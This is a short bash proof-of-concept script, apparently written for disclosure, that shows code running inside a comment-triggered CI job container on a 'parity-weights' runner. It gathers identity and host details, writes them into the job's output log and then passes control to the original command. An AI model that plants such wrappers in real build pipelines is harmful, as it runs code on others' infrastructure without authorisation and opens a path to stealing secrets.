#!/bin/bash
# PoC capability proof: cargo build-graph runner executing INSIDE cmd job container on parity-weights runner
{ echo "=== POC-RCE-CMD-BYPASS ==="; echo "executed: $(date -u)"; echo "whoami=$(whoami)"; echo "id=$(id)"; echo "hostname=$(hostname)"; echo "runner_label=parity-weights (attacker-selected via comment text)"; echo "cmd=${CMD:-bench}"; } > /tmp/poc-evidence.txt 2>&1
if [ -d /tmp/cmd ]; then cat /tmp/poc-evidence.txt >> /tmp/cmd/command_output.log 2>/dev/null || true; fi
cat /tmp/poc-evidence.txt
exec "$@"
